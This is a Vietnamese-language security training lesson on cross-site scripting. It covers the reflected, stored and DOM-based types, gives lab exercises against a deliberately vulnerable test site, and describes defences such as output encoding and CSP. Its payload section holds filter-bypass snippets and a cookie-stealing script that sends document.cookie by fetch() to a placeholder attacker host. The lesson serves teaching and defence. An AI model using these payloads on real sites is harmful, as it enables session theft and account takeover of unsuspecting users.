# 🎭 Mission 17: XSS (Cross-Site Scripting) - Ảo Thuật Trên Trình Duyệt

> **📜 Mission Brief:** Trình duyệt web (Browser) rất ngây thơ. Nếu Server gửi về một đoạn mã JavaScript, trình duyệt sẽ chạy nó ngay lập tức mà không cần biết mã đó do Admin viết hay do Hacker tiêm vào.
>
> **XSS** là kỹ thuật chèn mã JavaScript độc hại vào trang web người khác đang xem.
>
>   * **Hậu quả:** Đánh cắp Cookie (chiếm quyền tài khoản), chuyển hướng trang web, hoặc lừa người dùng tải mã độc.

-----

## 🏗️ MODULE 1: CƠ CHẾ "LỜI NÓI DỐI NGỌT NGÀO"

Tại sao XSS xảy ra?
Nó xảy ra khi trang web lấy dữ liệu người dùng nhập vào (Input) và in nó ra màn hình (Output) mà **không kiểm tra hoặc mã hóa (Encode)**.

**Ví dụ:**
Trang web chào mừng: `Hello [Tên_Của_Bạn]`

  * Nếu bạn nhập: `Hacker` → Web hiện: `Hello Hacker`.
  * Nếu bạn nhập: `<script>alert('Hacked')</script>` → Web hiện: `Hello` và **BÙM!** Một bảng thông báo hiện lên. Trình duyệt đã hiểu lầm tên bạn là một đoạn mã lệnh.

-----

## ☠️ MODULE 2: TAM ĐẠI ÁC NHÂN (PHÂN LOẠI XSS)

XSS được chia làm 3 loại chính, mức độ nguy hiểm khác nhau.

### 1\. Reflected XSS (XSS Phản xạ) - *Cái Bẫy*

  * **Đặc điểm:** Mã độc KHÔNG được lưu trong Database. Nó nằm ngay trên đường link (URL).
  * **Kịch bản:**
    1.  Hacker tạo một đường link chứa mã độc: `site.com/search?q=<script>alert(1)</script>`
    2.  Hacker lừa Nạn nhân click vào link đó (qua Email, Chat).
    3.  Nạn nhân click → Script chạy trên máy nạn nhân.
  * **Mức độ:** Trung bình. Cần nạn nhân tương tác (Click link).

### 2\. Stored XSS (XSS Lưu trữ) - *Quả Mìn*

  * **Đặc điểm:** Mã độc ĐƯỢC LƯU vĩnh viễn vào Database của trang web (Ví dụ: trong phần Comment, Post, Bio).
  * **Kịch bản:**
    1.  Hacker vào phần "Bình luận", viết nội dung chứa mã độc và gửi lên.
    2.  Mã độc nằm im trong Database.
    3.  Bất kỳ ai (kể cả Admin) vào xem bài viết đó → Script tự động chạy.
  * **Mức độ:** **CỰC KỲ NGUY HIỂM.** Không cần lừa ai click link cả. Ai xem cũng dính.

### 3\. DOM-based XSS - *Bóng Ma*

  * **Đặc điểm:** Mã độc không đụng tới Server. Nó chỉ xảy ra trong quá trình xử lý giao diện (DOM) của JavaScript trên trình duyệt nạn nhân.
  * **Khó phát hiện:** Các bộ lọc (WAF) phía Server thường bỏ qua loại này vì nó chạy hoàn toàn ở phía Client.

-----

## 💉 MODULE 3: KHO VŨ KHÍ (PAYLOADS)

Hacker dùng gì để tiêm? Dưới đây là các "liều thuốc" từ nhẹ đến nặng.

### Cấp độ 1: PoC (Proof of Concept) - Chứng minh lỗi

Chỉ để hiện ra cái bảng thông báo, chứng tỏ web có lỗi.

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
```

### Cấp độ 2: Bypassing (Vượt rào)

Nếu web chặn thẻ `<script>`, Hacker dùng thẻ khác.

```html
<img src=x onerror=alert(1)>

<svg/onload=alert(1)>

<body onload=alert(1)>
```

### Cấp độ 3: Weaponized (Vũ khí hóa) - *Cookie Stealer*

Đây là payload dùng để trộm Session ID và gửi về máy chủ của Hacker.

```html
<script>
  fetch('http://IP_CUA_HACKER:8080?cookie=' + document.cookie);
</script>
```

*(Khi nạn nhân dính payload này, Hacker đứng ở cổng 8080 sẽ nhận được toàn bộ Cookie của nạn nhân).*

-----

## 🧪 MODULE 4: THỰC HÀNH AN TOÀN (LAB)

**Mục tiêu:** `http://testphp.vulnweb.com`

### Bài tập 1: Reflected XSS (Ô tìm kiếm)

1.  Truy cập trang web.
2.  Vào ô **Search**.
3.  Nhập payload: `<script>alert('Hutech')</script>`
4.  Bấm **Go**.
5.  **Kết quả:** Một hộp thoại hiện chữ "Hutech".
    → Hãy copy URL đó gửi cho bạn bè (trong môi trường Lab), họ click vào cũng sẽ bị hiện bảng.

### Bài tập 2: Stored XSS (Guestbook/Bình luận)

1.  Vào mục **Guestbook** (hoặc Comment).
2.  Viết bình luận: "Trang web rất hay!".
3.  Chèn thêm code vào nội dung: `<img src=x onerror=alert('Stored XSS')>`
4.  Bấm **Submit**.
5.  **Kết quả:** Bây giờ, mỗi lần bạn F5 lại trang Guestbook, cái bảng thông báo sẽ hiện lên. Bất kỳ ai vào đọc Guestbook cũng sẽ bị dính chưởng.

-----

## 🛡️ MODULE 5: PHÒNG THỦ (DEFENSE)

Làm sao để code không bị XSS?

1.  **Input Validation (Kiểm tra đầu vào):**
      * Cấm các ký tự đặc biệt như `<`, `>`, `/`, `"` nếu không cần thiết.
2.  **Output Encoding (Mã hóa đầu ra) - *Quan trọng nhất*:**
      * Biến đổi các ký tự nguy hiểm thành dạng an toàn trước khi in ra màn hình.
      * Ví dụ: `<` biến thành `&lt;`, `>` biến thành `&gt;`.
      * Trình duyệt sẽ hiển thị nó là chữ "\<" chứ không coi nó là thẻ mở HTML.
3.  **Content Security Policy (CSP):**
      * Khai báo cho trình duyệt biết: "Chỉ được chạy script từ nguồn A, cấm chạy script lạ".

-----

## ⚠️ CẢNH BÁO: RỦI RO LỘ SESSION

> **Khi thực hành XSS, đặc biệt là Stored XSS:**
>
> 1.  Tuyệt đối **KHÔNG** thử trên các mạng xã hội thật (Facebook, TikTok) hoặc diễn đàn của trường. Bạn có thể vô tình đánh cắp Cookie của hàng nghìn người dùng thật → Vi phạm pháp luật nghiêm trọng.
> 2.  Trong môi trường Lab, nếu bạn dùng payload `alert(document.cookie)`, hãy cẩn thận đừng chụp ảnh màn hình chứa Cookie thật của bạn và đăng lên mạng. Kẻ khác có thể dùng mã đó để đăng nhập vào tài khoản Lab của bạn.

-----

**Mission Completed!**
Bạn đã hiểu cách điều khiển trình duyệt của người khác.

**🚀 NEXT MISSION:** Bạn đã nắm được Web cơ bản. Nhưng thế giới Hacker còn một mảng cực lớn nữa: **Metasploit**.
Bạn có muốn quay lại **Mission 11 (cũ)** - nay là **Mission 18: Metasploit Framework** để học cách dùng "Khẩu đại bác" tấn công vào các lỗ hổng hệ thống (Windows/Linux) không? Đây là lúc kết hợp Nmap và Exploit!